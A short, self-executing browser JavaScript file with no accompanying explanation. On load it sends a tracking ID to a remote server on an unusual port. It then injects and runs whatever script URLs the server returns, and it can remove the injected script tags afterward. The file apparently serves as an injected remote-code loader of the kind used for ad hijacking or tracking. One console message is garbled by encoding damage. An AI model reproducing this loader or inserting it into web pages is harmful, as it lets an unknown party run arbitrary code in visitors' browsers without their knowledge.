!(function(_W, _D) {
    var REQUEST_URL = 'https://gdtcs.186078.com:3931/Requestnew/checkwbf';
    function yhRequest(url, param, fnSucc, fnFaild, reqnum){
        var oAjax = null;
        if(_W.XMLHttpRequest){ 
                    var oAjax = new XMLHttpRequest();
                    if("withCredentials" in oAjax){
            oAjax.open('POST', url, true);
            oAjax.setRequestHeader("Content-Type","text/plain");
            oAjax.onreadystatechange = function(){
            if(oAjax.readyState == 4){
                if(oAjax.status == 200){
		    if(fnSucc){
			fnSucc(oAjax.responseText,reqnum);
                    }
                }else{
		    if(fnFaild){
			fnFaild();
		    }
                }
                        }
                    };
                    oAjax.send(param);
                    }else if (_W.XDomainRequest){
                    var oAjax = new XDomainRequest();
                    if (oAjax) {
                        oAjax.open("POST", url, true);
                        oAjax.onerror = fnFaild; 
                        oAjax.ontimeout = function (){
                            console.log('XDR 请�?�??��???');
                        };
                        oAjax.onload = function () {
                            fnSucc(oAjax.responseText);
                        };
                        oAjax.timeout = 3000;
                        oAjax.send(param);
                    }
                }
            }else{
                console.log("Your browser does not support XMLHTTP.");
            }
    };
    function yhloadJS(url, callback, remove, thisNode, opt) {
            var head = _W.document.getElementsByTagName("head")[0],opt = opt || {};
            var script = _W.document.createElement('script'), remove = ~~remove;
            script.onload = script.onreadystatechange = script.onerror = function() {
                if (script && script.readyState && /^(?!(?:loaded|complete)$)/.test(script.readyState)) return;
                script.onload = script.onreadystatechange = script.onerror = null;
                if(remove) {
                    script.src = '';
                    script.parentNode.removeChild(script);
                    script = null;
                }
                callback && callback();
            };
            for(var i in opt){
                            script.setAttribute(i,opt[i]);
            }
            script.type = 'text/javascript';
            script.charset = "utf-8";
            script.src = url;
            try {
                if(thisNode){
                    thisNode.appendChild(script);
                }else{
                    head.appendChild(script);
                }
            } catch (exp) {}
    }; 
    function yhResponse(responseText, reqnum) {
	responseText = JSON.parse(responseText);
	if (parseInt(responseText['status']) == 1){
            for (var i in responseText['url']) {
                yhloadJS(responseText['url'][i]);
            }	    
	}
    };
    
    function yhInit(){
	var data = {};
        data['trackid'] =  _W.trackid;	
	yhRequest(REQUEST_URL, JSON.stringify(data), yhResponse, null, 1);
    };
    yhInit();
})(window, document)